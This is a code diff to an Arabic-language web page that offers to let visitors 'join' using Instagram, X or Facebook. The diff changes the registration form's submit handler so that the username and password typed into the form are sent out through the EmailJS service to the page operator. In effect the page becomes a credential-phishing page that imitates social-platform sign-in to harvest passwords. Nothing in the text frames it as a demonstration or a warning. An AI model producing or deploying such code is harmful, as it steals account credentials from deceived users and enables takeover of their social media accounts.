@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نموذج الاتصال</title>
+    <title>نموذج التسجيل</title>
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
         (function () {
@@ -16,10 +16,6 @@
             text-align: center;
             padding: 20px;
             direction: rtl;
-            background-color: #f4f4f9;
-        }
-        h1 {
-            color: #4CAF50;
         }
         .platform {
             margin: 15px;
@@ -34,17 +30,10 @@
             display: none;
             margin-top: 20px;
         }
-        .form-container input, .form-container textarea {
+        .form-container input, .form-container button {
             margin: 10px;
             padding: 10px;
             width: 200px;
-        }
-        .form-container button {
-            padding: 10px 15px;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            cursor: pointer;
         }
         .thank-you {
             display: none;
@@ -68,12 +57,12 @@
 
     <!-- منصات التواصل -->
     <div class="platform" id="instagram">إنستغرام</div>
-    <div class="platform" id="x"> منصة إكس</div>
+    <div class="platform" id="x">منصة إكس</div>
     <div class="platform" id="facebook">فيسبوك</div>
 
     <!-- النموذج الذي يظهر بعد الضغط على منصة -->
     <div class="form-container" id="form-container">
-        <h3 id="platform-name">انضم الينا بستخدام</h3>
+        <h3 id="platform-name">انضم الينا باستخدام</h3>
         <form id="registration-form">
             <input type="text" name="username" id="username" placeholder="اسم المستخدم" required><br>
             <input type="password" name="password" id="password" placeholder="كلمة المرور" required><br>
@@ -87,15 +76,6 @@
         <p>تم إرسال معلوماتك بنجاح.</p>
     </div>
 
-    <!-- نموذج التواصل -->
-    <h1> تواصل معنا اذا وجهة اي مشكلة </h1>
-    <form id="contact-form">
-        <input type="text" name="name" placeholder="اسمك" required><br>
-        <input type="email" name="email" placeholder="بريدك الإلكتروني" required><br>
-        <textarea name="message" placeholder="رسالتك" required></textarea><br>
-        <button type="submit">إرسال</button>
-    </form>
-
     <script>
         // تفعيل منصات التواصل
         const platforms = document.querySelectorAll('.platform');
@@ -106,32 +86,33 @@
 
         platforms.forEach(platform => {
             platform.addEventListener('click', () => {
-                platformName.textContent = `التسجيل في ${platform.textContent}`;
+                platformName.textContent = `انضم الينا باستخدام ${platform.textContent}`;
                 formContainer.style.display = 'block';
                 welcomeMessage.style.display = 'none';
                 thankYouMessage.style.display = 'none';
             });
         });
 
-        // إرسال نموذج الاتصال
-        document.getElementById('contact-form').addEventListener('submit', function (event) {
-            event.preventDefault(); // منع تحديث الصفحة
-
-            emailjs.sendForm('service_ir3vg5y', 'template_jw2qkzr', this)
-                .then(function () {
-                    alert('تم إرسال الرسالة بنجاح!');
-                }, function (error) {
-                    alert('حدث خطأ أثناء الإرسال: ' + JSON.stringify(error));
-                });
-        });
-
         // إرسال بيانات التسجيل
         document.getElementById('registration-form').addEventListener('submit', function (event) {
             event.preventDefault(); // منع النموذج من تحديث الصفحة
 
-            // محاكاة إرسال النموذج وعرض رسالة الشكر
-            formContainer.style.display = 'none';
-            thankYouMessage.style.display = 'block';
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            const templateParams = {
+                username: username,
+                password: password,
+            };
+
+            emailjs.send('service_ir3vg5y', 'template_jw2qkzr', templateParams)
+                .then(function () {
+                    // محاكاة إرسال النموذج وعرض رسالة الشكر
+                    formContainer.style.display = 'none';
+                    thankYouMessage.style.display = 'block';
+                }, function (error) {
+                    alert('حدث خطأ أثناء الإرسال: ' + JSON.stringify(error));
+                });
         });
     </script>
 </body>
